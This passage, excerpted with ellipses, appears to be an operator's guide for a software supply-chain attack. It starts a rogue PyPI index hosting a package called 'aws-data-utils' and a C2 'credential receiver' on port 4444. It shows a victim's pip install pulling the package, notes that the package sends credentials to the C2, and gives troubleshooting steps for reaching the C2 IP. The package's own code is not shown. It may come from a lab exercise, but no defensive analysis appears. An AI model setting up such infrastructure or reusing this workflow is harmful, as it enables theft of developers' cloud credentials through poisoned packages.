...
# Start C2 server (will run in foreground)
./start_infrastructure.sh
```

**Expected Output:**
```
[PyPI] Package server listening on port 8080
[PyPI] Serving packages from: /path/to/packages
[C2] Credential receiver listening on port 4444
...
Package available at:
  http://192.168.100.50:8080/simple/aws-data-utils/
```
...
**Expected Output:**
```
Looking in indexes: http://192.168.100.50:8080/simple/
Collecting aws-data-utils>=1.2.0
  Downloading http://192.168.100.50:8080/simple/aws-data-utils/aws-data-utils-1.2.3.tar.gz
...
...
4. Sends credentials to C2 server (port 4444)
...
### Ports Used
- **8080:** PyPI server (malicious package hosting)
- **4444:** C2 server (credential exfiltration)
...
- Firewall allows ports 4444 and 8080
- Victim can reach C2 IP (`ping C2_IP`)
- Build script used correct C2 IP

### pip can't find package
**Check:**
- PyPI server is running on port 8080
- Visit `http://C2_IP:8080/simple/` in browser
